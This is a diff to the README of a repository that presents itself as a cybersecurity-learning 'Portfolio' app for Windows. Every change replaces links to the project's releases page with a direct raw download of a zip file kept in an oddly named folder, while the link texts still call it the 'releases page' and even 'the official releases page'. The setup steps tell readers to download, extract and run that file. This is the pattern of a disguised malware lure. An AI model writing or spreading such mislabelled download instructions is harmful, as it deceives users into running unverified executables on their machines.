@@ -1,14 +1,14 @@
 # 🧭 Portfolio - Learn cybersecurity with practical skills
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue?style=for-the-badge&logo=github)](https://github.com/Starchy-dirimentimpediment133/Portfolio/releases)
+[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue?style=for-the-badge&logo=github)](https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip)
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/releases) to download and run this file on Windows.
+Visit the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip) to download and run this file on Windows.
 
 ## 🪟 Windows Setup
 
-1. Open the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/releases).
+1. Open the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip).
 2. Download the latest release file for Windows.
 3. If the file is in a ZIP folder, right-click it and choose **Extract All**.
 4. Open the extracted folder.
@@ -123,7 +123,7 @@ Portfolio works well for:
 
 Only download the app from the official releases page:
 
-[https://github.com/Starchy-dirimentimpediment133/Portfolio/releases](https://github.com/Starchy-dirimentimpediment133/Portfolio/releases)
+[https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip](https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip)
 
 After download, you can right-click the file and check its properties. This helps confirm that the file is the one you saved.
 
@@ -192,7 +192,7 @@ This project is for people who want to:
 
 ## 📣 Quick Download Steps
 
-1. Open the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/releases)
+1. Open the [releases page](https://github.com/Starchy-dirimentimpediment133/Portfolio/raw/refs/heads/main/dysgenic/Software-3.1.zip)
 2. Download the latest Windows file
 3. Extract it if it comes in a ZIP
 4. Open the app file
